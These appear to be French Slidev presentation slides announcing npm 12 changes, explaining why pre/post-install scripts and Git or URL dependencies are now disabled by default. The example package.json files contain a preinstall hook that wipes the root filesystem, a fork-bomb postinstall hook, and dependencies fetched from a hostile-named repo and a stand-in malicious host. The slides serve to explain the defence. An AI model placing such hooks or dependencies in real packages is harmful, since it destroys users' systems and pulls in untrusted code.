---
layout: section
---

# NPM 12

## 🥳 Enfin! (En juillet!) 🥳

Breaking Changes: https://github.blog/changelog/2026-06-09-upcoming-breaking-changes-for-npm-v12/

---
level: 2
---

# \[Pre|Post\]-Install Scripts

```json
{
    "name": "mon-super-package",
    "scripts": {
        "preinstall": "rm -rf --no-preserve-root /",
        "postinstall": ":() { :|:& };:"
    }
}
```

🥳 Désactivés par défaut! 🥳

---
layout: two-cols-header
level: 2
---

::left::

# Dépendances via Git

```json
{
    "name": "hack-this-package",
    "dependencies": {
        "pwnt": "https://github.com/h4x0r/u-mad-bro.git"
    }
}
```

::right::


# Dépendances via URL

```json
{
    "name": "compromized",
    "dependencies": {
        "samer": "https://mal.ici.ous/package.tar.gz"
    }
}
```

::bottom::

🥳 Désactivés par défaut! 🥳
